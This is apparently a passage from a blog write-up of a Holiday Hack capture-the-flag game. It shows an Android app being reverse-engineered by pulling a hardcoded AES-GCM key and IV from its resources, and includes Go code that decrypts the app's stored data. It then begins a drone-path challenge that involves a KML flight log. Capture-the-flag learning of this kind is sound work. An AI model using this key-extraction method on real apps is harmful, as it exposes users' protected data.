"MWnFz+d1u/4QWNR3aZJ8rjR70ccFKItX81FQp//+9EtF+nURL4FI", "LGHG264527QzU91zZp0xolVdztwBJIRNvlt7/VakIoRl++rXlHttwhE=", "I2bMyOdwu/4FWdhqbp0x+1ku79wbJYVSvr7qGO5Zb23L3xCvXHMRYvs=", "KWnBlqJR8rI1WN9ybt9wyBxgztIZJUkQdjl75fDWiRSzBI1CHdw=", "I2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50=", "O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74=", "Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw==", "K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==", "JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY=", "L2nc3+01t5wpVt5txFJ8rjZhztwaI4NFdKbrVcU/JGUSzKJm3q3PSQ==", "LWTBzOt4u/4RVN11bp03+hpgjpM5JJ0EhbmhO4wHNjmjzqwzDO366z8XlmAxBAo=", "JmnG0+d1u/4MXtl4aZ01/Rd70NRbYblLqqiod6wPIKlWAvC4AsA71TXm3aAJve9HIUA=", "LGfa2645278hXsI1J7056RB8y9LIAUNdOdmXkW3fRpcNUxV8", "MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==", "Lm3B1uM1t58qVth8dYB8rjRixdYFKItGdCiZJowXSEk2P7+XCerx", "KWHFlqJb4q0nX505VJwl+h0u6dwFJIuiXi2lY6YPZ4CjViAKRpaC", "Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz", "LWXJyK4507EuUJ05VpIk7wcjUnL2xhkJz8n9Dm47dXGt", "L2na0+c1t5IzSdR0ZZwl/BIigv8COY9JvbO1JYqohuoT5OQ0dvvUWILo1jaO", "NmfFlqJK9rBmd8N4aZA5/RZhjpMiEqvWVxuq2sU0ngeuJh5Bmivp", "Km3E3+x4u/4QWNR3aZJ8rjR70ccFKIsDa5wYsSNXEVH6T9VNnoNh", "I3rCz+w1t5wnX9Z4a5wi61ku690TKIvYZgzmW1HQgG0OvS+GZrqX", "L2nazuM1t440UNZsYt9wzQ9rwdtXE49Uqr6sPo4tNlgEErLmy2e9McwjexaZ", "MWHF1ew1t5kjX9RvZt9w3QJn1skSM4ZFsbjUNmfsNMnhkq0GBwNdRuQQ", "I2bJlqJD9rk0VNM1J7Ai4RR6y9JIjLKEIfFIhBPBpLBEqomH", "MGnO2+d1u/4WXsNtaN9w3hp81sYQIIbYlRYHiSlXMoS4tPdilxhG", "LmHG3uM1t4wjSNpzZoU55Vku69ASLYtKu2L+bDaBlZjDIaGNeZhBJqA=", "L2HL0uN1u/4EQ9BtboA87wNvjpMkLYVSvrepNgEBI1AclZNI8gyCBYQG2eM=", "J37JlqJb4ronQdRqc99wxgBgxdIFOAlaPoAgk8c4iPDAzcEuNDE=", "LGHD1e54/vJmfN5qZJwnolVc18AEKIvjrzloQ+cC1iWupZVahPs2", "KWDJ3utz9vJmddByZoF8riZrzNYQIIbM23+WAVV6B504yBF/YTdb", "O2fdyfF88fJmY9B7Zod8rjhh0NwUIoVxNH9I0bHcUbdrTrTpnIWL", "LmndyOM1t5IvXNA1J6M1/ADJIEAtaTSWOs3rUHGxE23v", "KH3J1K45xqsvRd41J7Yz+xRqzcGKc2ANFJm7yAP/iEAOkACn", "L2na0+M1t40nX5FTcpI+olVe19YFNYUEjbWjOJpcl9JvvyJ7scI8el5JTy4=", "I2TBlqJN4rAvQp05U4Y+5wZnw7REbFTEsKKaYtEbT4D/BfA=", "I2TB1OM1t5wzUtl4dZYj+lku8NwaIIRNvvtC1rkdlxBlbKrQAX6AucI=", "JmHF0/Zr/vJmeth8cd9w2x58w9oZJM51yxayaVH4ddqhS9Ld+lI=", "J2XF2+xs8rJqEf14YJwjolVAy9QSM4NFBawvI9LTb3YoXPhmLC/pDw==", "KH3E0+M1t4gvVN93Zt9wzwB91sEeIEtgVtuakzge6p44dqbJkEc=", "MGfK3/Btu/4BXdBqYJwnolVdwdwDLYtKu+LDoHra5pWd9cdD5y0f3Mo=", "I2bJyfZ45LcnHZFKZpo++lVex8cSM5lGqq6ne807J7NGCggtcc93Ohi+VKRgXDKpmdgI", "J2bS1a452rcqUN81J7ok7xl3dnBUBK/NLqVw5yX69lhDyQ==", "I2Hb0uM1t5QnWtBrc5J8rjxgxtwZJJlNvvHYzXGTBJ/ect8fCv2lmE4=", "L2nc3/dq7fJmdtV4aYA7olVezd8WL47176gxNd+vY9fx4MSmT2ej", "MGfb2645378wUN94K9MT+xdvICDOUBRXAjmOpELQySokFQ==", "JmHN3e01t40nX8V2J7c/4xxgxdxbYa5LsrWuPo4IPOBnBhkbfJx6kuAQ5S2AHRJNPm+/JMsu2Y4=", "K3vJ2Od1u/4LUN9wa5J8riVmy98eMZpNsbmz/o7XqAaLAwARWkH6eIgkvg==", "JmnG0+d1u/4FUMN4ZJIjolVYx90SO59Bs72pxXLFYIQzfSavfBYeKvSp", "MWfO0+M1t40pV9h4K9MS+xlpw8EeIOWh30NfCMogzRbG9bbOpOQ=", "L33bzuN/9vJmc9B+b5cx6lku68EWMIJsYV5vA84d075o0zjkKww=", "L23BlqJN9rc2VNg1J6cx5wJvzCDEGFoHhNAE0ZQMzBepH+M=", "JW3HyOV8u/4IUNhraJE5olVFx90OIIDivPFcm6m1iBokvOvJ6Jw=", "LmHG26451bsvQ8RtK9Mc6xdvzNwZZ/8B9lM2+mUZn77BIM0HBQ==", "KGfb3645xL8oEft2dDD5olVNzcADIMp2tr+hjSygfMWJwjL2dFscDmwjjg==", "L2HJlqJN9rIqWN93K9MV/QFhzNoWqj9VHhFMZ8Go9BUGzcsDyA==", "KGfG2/E1t4gvXd9wcoB8rjln1tsCIIRNvmU7T9+1tpsYdtrvmWv1l7U=", "J2TB2/E1t5YjXcJwaZg5olVIy90bIIRA/1z33GgMGZTTRJFra6XBzA==", "OGna26453q0qUNx4ZZI0olVew9geMp5FsXmupyWxdH/oy9rxaRJqUOA=", "I2zJ16451awnRdhqa5Im71ku8d8YN4tPtr1l2Twrd2VbP7DifnHx1H8R", "J2TB3K451rAtUMN4K9ME+wdlx8rZbZqbfhGZr3wzxCxB4bYI", "Ln3LlqJJ9qwvQp05QYEx4BZrln569Gq0kHSy+WS+n1k/sA==", "LmndyOM1t5MnVcNwY99w3QVvy916DDmwWl6gWeYjk2X3jVl2", "NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR", "MWna2645xKopUtpxaJ89olVd1dYTJISsz5CtbxJFXJPiMCte0noG", "I2TNwuN386wjHZFbdYYj/RBi0Z9XA49IuLW1OoUxRdZ+wmfnJvvtJwXi10k=", "L2na0+M1t5IvQtN2ad9w3hp81sYQIIYOpc2XzyjeMgAWf7nbp/ts", "L2HL0uN8+/Jmfd53Y5w+olVbzNoDJI4ElLWuMIkGP9LTeVuwVKu4l7DOB1U91N0=", "J2XB1vs1t5ozU91wad9wxwdrztIZJQMfNE4DYwx1R7bg5c50NDQ=", "Jmne0+Y1t40/Vd98ft9wzwB91sEWLYNFu2xWVc39+4i1Bn7JWwoynA==", "J2XF26451qslWt14aZd8rjtr1ZMtJItIvrKk5S9JSEZ8qKvgRP2Mvcy4eQ==", "Ln3Bya452rs+WNJ2J7A5+gwigv4SOYNHsHi4IVfVImdVO9OdwBX0/mw=", "IWnc0udr/rAjHZFWc4cx+RQigvAWL4tAvg5ALUCnxBG/cw3LfEmj4oA=", "NmfFeSNqu/4LXt9tYoU56hBhjpMiM59Dqr253YTDn38uXKJ5tl00FEINTg==", "I2bG26451LE2VN9xZpQ14Fku5tYZLItWtJEJuhXmygDg52L+RBvqJyA=", "Mm3c3/A1t5E1Xd41J70//AJv27+zexRjk1E0oOdUtHEChqA=", "KH3E0+M1t5wjQ91wad9wyRB8z9IZOJNUHr+RrQebnoaStFwY+6Y=", "MWnFz+d1u/4QWNR3aZJ8rjR70ccFKItX81FQp//+9EtF+nURL4FI", "LGHG264527QzU91zZp0xolVdztwBJIRNvlt7/VakIoRl++rXlHttwhE=", "I2bMyOdwu/4FWdhqbp0x+1ku79wbJYVSvr7qGO5Zb23L3xCvXHMRYvs=", "KWnBlqJR8rI1WN9ybt9wyBxgztIZJUkQdjl75fDWiRSzBI1CHdw=", "I2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50=", "O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74=", "Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw==", "K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==", "JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY=", "MWfO0+M1t58yWdR3dN9wyQdrx9AS/R916miej6pBB+UB54ZZ1g==", "L2nc3+01t5wzVN92dNMR5wdr0Z9XAJhDurK0PoMIwB3/YInPpneEf/Q3blsrDg==", "LWTBzOt4u/4RVN11bp03+hpgjpM5JJ0EhbmhO4wHNjmjzqwzDO366z8XlmAxBAo=", "JmnG0+d1u/4MXtl4aZ01/Rd70NRbYblLqqiod6wPIKlWAvC4AsA71TXm3aAJve9HIUA=", "LGfa2645278hXsI1J7056RB8y9LIAUNdOdmXkW3fRpcNUxV8", "MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==", "Lm3B1uM1t58qVth8dYB8rjRixdYFKItGdCiZJowXSEk2P7+XCerx", "KWHFlqJK8rEzXZ05VJwl+h0u6dwFJIuDD8ONR42MoY7KFht/QJfy", "Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz", "LWXJyK4507EuUJ05VpIk7wcjUnL2xhkJz8n9Dm47dXGt", "L2na0+c1t5IzSdR0ZZwl/BIigv8COY9JvbO1JYqohuoT5OQ0dvvUWILo1jaO", "NmfFlqJR+Ks1Rd53K9MF3TQJIJtqQwmr4zdVTQ9laNPM", "Km3E3+x4u/4QWNR3aZJ8rjR70ccFKIsDa5wYsSNXEVH6T9VNnoNh", "I3rCz+w1t5ojXdlwK9MZ4BFnwzwsgLd0z5uSRxTqIB8aQs4=", "L2nazuM1t440UNZsYt9wzQ9rwdtXE49Uqr6sPo4tNlgEErLmy2e9McwjexaZ", "MWHF1ew1t4QzQ9h6b99w3QJn1skSM4ZFsbgRVLExuZmptZSHE6Yrul/e", "I2bJlqJD9rk0VNM1J7Ai4RR6y9JIjLKEIfFIhBPBpLBEqomH", "MGnO2+d1u/4WXsNtaN9w3hp81sYQIIbYlRYHiSlXMoS4tPdilxhG", "LmHG3uM1t4wjSNpzZoU55Vku69ASLYtKu2L+bDaBlZjDIaGNeZhBJqA=", "L2HL0uN1u/4EQ9BtboA87wNvjpMkLYVSvrepNgEBI1AclZNI8gyCBYQG2eM=", "J37JlqJb4ronQdRqc99wxgBgxdIFOAlaPoAgk8c4iPDAzcEuNDE=", "LGHD1e54/vJmfN5qZJwnolVc18AEKIvjrzloQ+cC1iWupZVahPs2", "KWDJ3utz9vJmddByZoF8riZrzNYQIIbM23+WAVV6B504yBF/YTdb", "O2fdyfF88fJmY9B7Zod8rjhh0NwUIoVxNH9I0bHcUbdrTrTpnIWL", "LmndyOM1t5IvXNA1J6M1/ADJIEAtaTSWOs3rUHGxE23v", "KH3J1K45xqsvRd41J7Yz+xRqzcGKc2ANFJm7yAP/iEAOkACn", "L2na0+M1t40nX5FTcpI+olVe19YFNYUEjbWjOJpcl9JvvyJ7scI8el5JTy4=", "I2TBlqJN4rAvQp05U4Y+5wZnw7REbFTEsKKaYtEbT4D/BfA=", "I2TB1OM1t5wzUtl4dZYj+lku8NwaIIRNvvtC1rkdlxBlbKrQAX6AucI=", "JmHF0/Zr/vJmeth8cd9w2x58w9oZJM51yxayaVH4ddqhS9Ld+lI=", "J2XF2+xs8rJqEf14YJwjolVAy9QSM4NFBawvI9LTb3YoXPhmLC/pDw==", "KH3E0+M1t4gvVN93Zt9wzwB91sEeIEtgVtuakzge6p44dqbJkEc=", "MGfK3/Btu/4BXdBqYJwnolVdwdwDLYtKu+LDoHra5pWd9cdD5y0f3Mo=", "I2bJyfZ45LcnHZFKZpo++lVex8cSM5lGqq6ne807J7NGCggtcc93Ohi+VKRgXDKpmdgI", "J2bS1a452rcqUN81J7ok7xl3dnBUBK/NLqVw5yX69lhDyQ==", "I2Hb0uM1t5QnWtBrc5J8rjxgxtwZJJlNvvHYzXGTBJ/ect8fCv2lmE4=", "L2nc3/dq7fJmdtV4aYA7olVezd8WL47176gxNd+vY9fx4MSmT2ej", "MGfb2645378wUN94K9MT+xdvICDOUBRXAjmOpELQySokFQ==", "JmHN3e01t40nX8V2J7c/4xxgxdxbYa5LsrWuPo4IPOBnBhkbfJx6kuAQ5S2AHRJNPm+/JMsu2Y4=", "K3vJ2Od1u/4LUN9wa5J8riVmy98eMZpNsbmz/o7XqAaLAwARWkH6eIgkvg==", "JmnG0+d1u/4FUMN4ZJIjolVYx90SO59Bs72pxXLFYIQzfSavfBYeKvSp", "MWfO0+M1t40pV9h4K9MS+xlpw8EeIOWh30NfCMogzRbG9bbOpOQ=", "L33bzuN/9vJmc9B+b5cx6lku68EWMIJsYV5vA84d075o0zjkKww=", "L23BlqJN9rc2VNg1J6cx5wJvzCDEGFoHhNAE0ZQMzBepH+M=", "JW3HyOV8u/4IUNhraJE5olVFx90OIIDivPFcm6m1iBokvOvJ6Jw=", "LmHG26451bsvQ8RtK9Mc6xdvzNwZZ/8B9lM2+mUZn77BIM0HBQ==", "KGfb3645xL8oEft2dDD5olVNzcADIMp2tr+hjSygfMWJwjL2dFscDmwjjg==", "L2HJlqJN9rIqWN93K9MV/QFhzNoWqj9VHhFMZ8Go9BUGzcsDyA==", "KGfG2/E1t4gvXd9wcoB8rjln1tsCIIRNvmU7T9+1tpsYdtrvmWv1l7U=", "J2TB2/E1t5YjXcJwaZg5olVIy90bIIRA/1z33GgMGZTTRJFra6XBzA==", "OGna26453q0qUNx4ZZI0olVew9geMp5FsXmupyWxdH/oy9rxaRJqUOA=", "I2zJ16451awnRdhqa5Im71ku8d8YN4tPtr1l2Twrd2VbP7DifnHx1H8R", "J2TB3K451rAtUMN4K9ME+wdlx8rZbZqbfhGZr3wzxCxB4bYI", "Ln3LlqJJ9qwvQp05QYEx4BZrln569Gq0kHSy+WS+n1k/sA==", "LmndyOM1t5MnVcNwY99w3QVvy916DDmwWl6gWeYjk2X3jVl2", "NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR", "MWna2645xKopUtpxaJ89olVd1dYTJISsz5CtbxJFXJPiMCte0noG", "I2TNwuN386wjHZFbdYYj/RBi0Z9XA49IuLW1OoUxRdZ+wmfnJvvtJwXi10k=", "L2na0+M1t5IvQtN2ad9w3hp81sYQIIYOpc2XzyjeMgAWf7nbp/ts", "L2HL0uN8+/Jmfd53Y5w+olVbzNoDJI4ElLWuMIkGP9LTeVuwVKu4l7DOB1U91N0=", "J2XB1vs1t5ozU91wad9wxwdrztIZJQMfNE4DYwx1R7bg5c50NDQ=", "Jmne0+Y1t40/Vd98ft9wzwB91sEWLYNFu2xWVc39+4i1Bn7JWwoynA==", "J2XF26451qslWt14aZd8rjtr1ZMtJItIvrKk5S9JSEZ8qKvgRP2Mvcy4eQ==", "Ln3Bya452rs+WNJ2J7A5+gwigv4SOYNHsHi4IVfVImdVO9OdwBX0/mw=", "IWnc0udr/rAjHZFWc4cx+RQigvAWL4tAvg5ALUCnxBG/cw3LfEmj4oA=", "NmfFeSNqu/4LXt9tYoU56hBhjpMiM59Dqr253YTDn38uXKJ5tl00FEINTg==", "I2bG26451LE2VN9xZpQ14Fku5tYZLItWtJEJuhXmygDg52L+RBvqJyA=", "Mm3c3/A1t5E1Xd41J70//AJv27+zexRjk1E0oOdUtHEChqA=", "KH3E0+M1t5wjQ91wad9wyRB8z9IZOJNUHr+RrQebnoaStFwY+6Y=", "MWnFz+d1u/4QWNR3aZJ8rjR70ccFKItX81FQp//+9EtF+nURL4FI", "LGHG264527QzU91zZp0xolVdztwBJIRNvlt7/VakIoRl++rXlHttwhE=", "I2bMyOdwu/4FWdhqbp0x+1ku79wbJYVSvr7qGO5Zb23L3xCvXHMRYvs=", "KWnBlqJR8rI1WN9ybt9wyBxgztIZJUkQdjl75fDWiRSzBI1CHdw=", "I2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50=", "O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74=", "Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw==", "K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==", "JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY=", "MWfO0+M1t58yWdR3dN9wyQdrx9AS/R916miej6pBB+UB54ZZ1g==", "L2nc3+01t5wzVN92dNMR5wdr0Z9XAJhDurK0PoMIwB3/YInPpneEf/Q3blsrDg==", "LWTBzOt4u/4RVN11bp03+hpgjpM5JJ0EhbmhO4wHNjmjzqwzDO366z8XlmAxBAo=", "JmnG0+d1u/4MXtl4aZ01/Rd70NRbYblLqqiod6wPIKlWAvC4AsA71TXm3aAJve9HIUA=", "LGfa2645278hXsI1J7056RB8y9LIAUNdOdmXkW3fRpcNUxV8", "MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==", "Lm3B1uM1t58qVth8dYB8rjRixdYFKItGdCiZJowXSEk2P7+XCerx", "KWHFlqJK8rEzXZ05VJwl+h0u6dwFJIuDD8ONR42MoY7KFht/QJfy", "Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz", "LWXJyK4507EuUJ05VpIk7wcjUnL2xhkJz8n9Dm47dXGt", "L2na0+c1t5IzSdR0ZZwl/BIigv8COY9JvbO1JYqohuoT5OQ0dvvUWILo1jaO", "NmfFlqJV+K1mcN9+Yp81/Vku9+A2aAwUTns96j8eMWk7TUtSxw==", "J2zf2/B95PJmf9RuJ7k1/AZr259XFLll5xvRfxu/YDOTFR460RwK+Q=="}).iterator();

```

This method is of more use. It's the method that decypts data. We can review
this and find a wasy to decrypt the data from the code blocks above. Just as
long as we can find the initialization vector (IV) and encryption key.

The `decryptData()` method tells us the following information.

- Encryption: AES-GCM 128 bit
- Uses an Initialization vector.
- Uses an encryption key.
- The IV and the encryption key are encoded in Base64.

With this we could write some code to do this with the encrypted data. But, we
would need the IV and the encryption key.

```java
    private final String decryptData(String encryptedData) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(2, this.secretKeySpec, new GCMParameterSpec(128, this.iv));
            byte[] doFinal = cipher.doFinal(Base64.decode(encryptedData, 0));
            Intrinsics.checkNotNull(doFinal);
            return new String(doFinal, Charsets.UTF_8);
        } catch (Exception e) {
            Log.e("DatabaseHelper", "Decryption failed: " + e.getMessage());
            return null;
        }
    }
```

This is where the hints are helpful. There are files that provide resource
strings that can be used by the application. I found one in the path 
`./SantaSwipeSecure/resources/res/values/strings.xml` where is a string named
`iv` and `ek`. Both of which are encoded in Base64.

- Encryption Key: rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=
- Initialization Vector: Q2hlY2tNYXRlcml4

These will come of great use for decypting the data we've found. I will be
writting a decyption in Go to get this moving.

```xml
<string name="dialog">Dialog</string>
<string name="dropdown_menu">Dropdown menu</string>
<string name="ek">rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=</string>
<string name="expanded">Expanded</string>
<string name="in_progress">In progress</string>
<string name="indeterminate">Partially checked</string>
<string name="iv"Q2hlY2tNYXRlcml4</string>
<string name="m3c_bottom_sheet_pane_title">Bottom Sheet</string>
<string name="navigation_menu">Navigation menu</string>
<string name="not_selected">Not selected</string>
```

In this code exerpt. I made a function named `decryptAesGcm()` that will take
the ciphertext, key, and initilization vector. It will then decode these from
Base64. Then it will create a new cipher block and use that AES blog to generate
a GCM handler. Once everything is staged. It will attempt to open the the GCM
method and decrypt the ciphertext using the key and the initialization vector.
Then it will return it in clear text.

```go
package main

import (
	"crypto/aes"
    "crypto/cipher"
	"encoding/base64"
	"fmt"
)

func decryptAesGcm(ciphertext, key, nonce string) string {
	decodedCiphertext, err := base64.StdEncoding.DecodeString(ciphertext)
	if err != nil {
        fmt.Printf("%s\n", err)
	}
	
	decodedKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
        fmt.Printf("%s\n", err)
	}
	
	decodedNonce, err := base64.StdEncoding.DecodeString(nonce)
	if err != nil {
        fmt.Printf("%s\n", err)
	}
	
	block, err := aes.NewCipher(decodedKey)
    if err != nil {
        fmt.Printf("%s\n", err)
    }
    
	gcm, err := cipher.NewGCM(block)
    if err != nil {
        fmt.Printf("%s\n", err)
    }

	plaintext, err := gcm.Open(nil, decodedNonce, decodedCiphertext, nil)
	if err != nil {
        fmt.Printf("%s\n", err)
	}

	return string(plaintext)
...
}
```

This is the exerpt where I use the function to decrypt the `partOne` data. But,
there is also a second part after you decrypt the query. 

```go
func main() {
    ...
	partOne := "IVrt+9Zct4oUePZeQqFwyhBix8cSCIxtsa+lJZkMNpNFBgoHeJlwp73l2oyEh1Y6AfqnfH7gcU9Yfov6u70cUA2/OwcxVt7Ubdn0UD2kImNsclEQ9M8PpnevBX3mXlW2QnH8+Q+SC7JaMUc9CIvxB2HYQG2JujQf6skpVaPAKGxfLqDj+2UyTAVLoeUlQjc18swZVtTQO7Zwe6sTCYlrw7GpFXCAuI6Ex29gfeVIeB7pK7M4kZGy3OIaFxfTdevCoTMwkoPvJuRupA6ybp36vmLLMXaAWsrDHRUbKfE6UKvGoC9d5vqmKeIO9elASuagxjBJ"
	partTwo := "KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8="
	
	key := "rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw="
	nonce := "Q2hlY2tNYXRlcml4"
	
	fmt.Println("Mobile Analysis (Gold) - Part 1")

	partOnePlaintext := decryptAesGcm(partOne, key, nonce)

	fmt.Printf("\n%s\n\n", partOnePlaintext)
	
	fmt.Println("Mobile Analysis (Gold) - Part 2")
	
	partTwoPlaintext := decryptAesGcm(partTwo, key, nonce)
	
	fmt.Printf("\n%s\n\n", partTwoPlaintext)

}
```

As seen above. I ran this in two stages. In this stage you decript the query and
it provides an `INSERT` query into the `NormalList`. But, it look like the value
is also encrypted.

```sql
CREATE TRIGGER DeleteIfInsertedSpecificValue
    AFTER INSERT ON NormalList
    FOR EACH ROW
    BEGIN
        DELETE FROM NormalList WHERE Item = 'KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8=';
    END;
```

But, if I run the function on the same command on the encrypted value in the
query. It provides the following output.

```sh
Joshua, Birmingham, United Kingdom
```

With finding that I decided to put the name `Joshua` in the submission and I got
the achievement for finishing the gold part of this challenge.

Eve Snowshoes has some dialog to confirm we've finished this challenge as well.

> Aha! Success! You found it!
>
> Thanks for staying on your toes and helping me out—every step forward keeps 
> Alabaster’s plans on track. You're a real lifesaver!
>
> -- **Eve Snowshoes (Front Yard (Act II))**

## Drone Path

> Help the elf defecting from Team Wombley get invaluable, top secret intel to 
> Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.

In the DMZ past the two elves there is Chimeny Scissorsticks. Who provides some
dialog saying he's trying to exfiltrate data to Alabaster's side. Noting that
Wombley is planning something with an armada of drones.

{{< image src="drone-path/drone-path-terminal.png" alt="chimeny scissorsticks and the drone path terminal in dmz" position="center" style="border-radius: 8px;" >}}

In this challenge we'll be working with KML files, tracking drone flight paths,
and potentially obtaining the admin password for a website from within the drone
flight logs. So with that in mind. Let's get to it!

> Hey. Psst, over here. Hey, I'm Chimney Scissorsticks.
> 
> I'm not liking all the tension brewing between the factions, so even though 
> I agreed with how Wombley was handling things, I get the feeling this is going 
> to end poorly for everyone. So I'm trying to get this data to Alabaster's 
> side. Can you help?
>
> Wombley's planning something BIG in that toy factory. He's not really making 
> toys in there. He's building an armada of drones!
> 
> They're packed with valuable data from the elves working on the project. I 
> think they hide the admin password in the drone flight logs. We need to crack 
> this to prevent this escalating snowball showdown.
>
> You'll be working with KML files, tracking drone flight paths. Intriguing, 
> right? We need every detail to prepare for what’s ahead!
>
> Use tools like Google Earth and some Python scripting to decode the hidden 
> passwords and codewords locked in those files.
> 
> Ready to give it a go? It’s going to be a wild ride, and your skills might 
> just turn the tide of this conflict!
> 
> -- **Chimney Scissorsticks (Front Yard (Act II))**

Clicking on the Cranberry Pi terminal takes you to a website named the `Elf
Drone Workshop`. This seems to be where you can administer drones and upload/view 
logs for them too..

{{< image src="drone-path/elf-drone-workshop.png" alt="home page for drone path web app" position="center" style="border-radius: 8px;" >}}

I provided the link to the Elf Drone Workshop below. Which came in handy for
reviewing the code for the site.

- [Elf Drone Workshop](https://hhc24-dronepath.holidayhackchallenge.com/)

After some poking around I found a file named `fritjolf-Path.kml` in the `Menu >
FileShare path. This file is available without authentication. So I downloaded
it. 

{{< image src="drone-path/fritjolf-Path.png" alt="download page for fritjolf-path.kml file" position="center" style="border-radius: 8px;" >}}

Here is a link to the `fritjolf-Path.kml` file for download.

- [fritjolf-Path.kml](https://hhc24-dronepath.holidayhackchallenge.com/files/fritjolf-Path.kml)

After downloading the file I decided to take a look at it. I'm not entirely
familiar with KML files. But, from what I've read Keyhole Markup Language is an
XML formatted file that contains geographical data. One use case is the
visualization of that geographical data.

While looking through the file. I notice this is must have been downloaded from
Google Earth due to URLs. There is an initial longitude/latitude and then there
is a `<coordinates>` tag. Which has a slew of coordinates to look at.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:kml="http://www.opengis.net/kml/2.2" xmlns:atom="http://www.w3.org/2005/Atom">
<Document>
        <name>fritjolf-Path</name>
        <gx:CascadingStyle kml:id="__managed_style_2398E937F13251C4AAA6">
                <Style>
                        <IconStyle>
                                <scale>1.2</scale>
                                <Icon>
                                        <href>https://earth.google.com/earth/rpc/cc/icon?color=1976d2&amp;id=2000&amp;scale=4</href>
                                </Icon>
                                <hotSpot x="64" y="128" xunits="pixels" yunits="insetPixels"/>
                        </IconStyle>
                        <LabelStyle>
                        </LabelStyle>
                        <LineStyle>
                                <color>ff2dc0fb</color>
                                <width>6</width>
                        </LineStyle>
                        <PolyStyle>
                                <color>40ffffff</color>
                        </PolyStyle>
                        <BalloonStyle>
                                <displayMode>hide</displayMode>
                        </BalloonStyle>
                </Style>
        </gx:CascadingStyle>
        <gx:CascadingStyle kml:id="__managed_style_177256F1433251C4AAA6">
                <Style>
                        <IconStyle>
                                <Icon>
                                        <href>https://earth.google.com/earth/rpc/cc/icon?color=1976d2&amp;id=2000&amp;scale=4</href>
                                </Icon>
                                <hotSpot x="64" y="128" xunits="pixels" yunits="insetPixels"/>
                        </IconStyle>
                        <LabelStyle>
                        </LabelStyle>
                        <LineStyle>
                                <color>ff2dc0fb</color>
                                <width>4</width>
                        </LineStyle>
                        <PolyStyle>
                                <color>40ffffff</color>
                        </PolyStyle>
                        <BalloonStyle>
                                <displayMode>hide</displayMode>
                        </BalloonStyle>
                </Style>
        </gx:CascadingStyle>
        <StyleMap id="__managed_style_08C7CAFB983251C4AAA6">
                <Pair>
                        <key>normal</key>
                        <styleUrl>#__managed_style_177256F1433251C4AAA6</styleUrl>
                </Pair>
                <Pair>
                        <key>highlight</key>
                        <styleUrl>#__managed_style_2398E937F13251C4AAA6</styleUrl>
                </Pair>
        </StyleMap>
        <Placemark id="06AEB73AFD323DB38AEB">
                <name>fritjolf-Path</name>
                <LookAt>
                        <longitude>98.45958448116764</longitude>
                        <latitude>-86.34782448283728</latitude>
                        <altitude>3933.282925076723</altitude>
                        <heading>266.5424437916514</heading>
                        <tilt>0</tilt>
                        <gx:fovy>35</gx:fovy>
                        <range>5615503.459923863</range>
                        <altitudeMode>absolute</altitudeMode>
                </LookAt>
                <styleUrl>#__managed_style_08C7CAFB983251C4AAA6</styleUrl>
                <LineString>
                        <coordinates>
                                -58.52967255925983,-81.96544152531006,0 -59.10774876930002,-80.28840427318642,0 -65.72254600105737,-77.9766682035318,0 -73.9875914587532,-77.76516666863455,0 -91.05394381429868,-77.90731001637202,0 -98.06339305755023,-78.99146253042231,0 -102.2303792314312,-81.20027229790867,0 -95.98077310873283,-83.25371393186903,0 -82.07101780164206,-83.29776912973317,0 -83.23520661371359,-81.00695945931643,0 -81.76235789483795,-83.29564134262864,0 -102.9965062974018,-83.14550260567364,0 -95.62041991622014,-83.22291342789609,0 -102.1576732322808,-81.16235281786211,0 -105.371495686142,-81.14693579622997,0 -119.1775433233275,-84.6554672500059,0 -118.3365602745079,-85.19567610400406,0 -110.4807824668064,-85.02562921664807,0 -45.22997899179316,-83.84077683330376,0 -111.7741500227319,-85.01005790395843,0 -119.2870869746066,-85.18624435024202,0 